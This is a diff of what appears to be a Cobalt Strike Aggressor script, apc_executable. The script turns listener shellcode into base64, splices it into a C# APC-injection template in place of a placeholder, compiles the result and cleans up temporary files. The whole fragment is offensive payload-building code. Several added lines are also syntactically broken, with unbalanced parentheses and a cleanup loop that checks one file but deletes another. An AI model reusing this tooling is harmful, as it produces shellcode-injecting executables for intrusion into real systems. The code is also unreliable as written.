@@ -42,13 +42,14 @@ sub apc_executable {
 	$version = iff(%options["dotnet35"] eq "true", "net35", "net40");
 	$listener = %options["listener"];
 	$outputformat = %options["output"];
+	elog(script_resource());
 	
 	# Generate shellcode and base64 it
 	$rawshellcode  = artifact_payload($listener, "raw", "x64");
 	$shellcode = base64_encode($rawshellcode);
 		
 	# Replace junk with shellcode
-	$handle = openf(script_resource("/executable_templates/UrbanBishop/Program.cs"));
+	$handle = openf(script_resource("/executable_templates/APC_TEMPLATE.cs"));
 	$apc = readb($handle, -1);
 	closef($handle);
 	$newapc = strrep($apc, 'REPLACETHISWITHSHELLCODE', $shellcode);
@@ -66,16 +67,23 @@ sub apc_executable {
 		if($outfile eq "")
 		{
 			show_message("Compiling failed");
+			while (-exists script_resource("/executable_temps/APC.cs")
+			{
+				sleep(100);
+				deleteFile($outfile);
+			}
+			return;
 		}
 		else{
 			show_message("Compiling successful");
+			while (-exists script_resource("/executable_temps/APC.cs")
+			{
+				sleep(100);
+				deleteFile(script_resource("/executable_temps/APC.cs");
+			}
+			return;
 		}
 	});
-	while (-exists $apcoutfile)
-	{
-		sleep(100);
-		deleteFile($apcoutfile);
-	}
 }
 
 
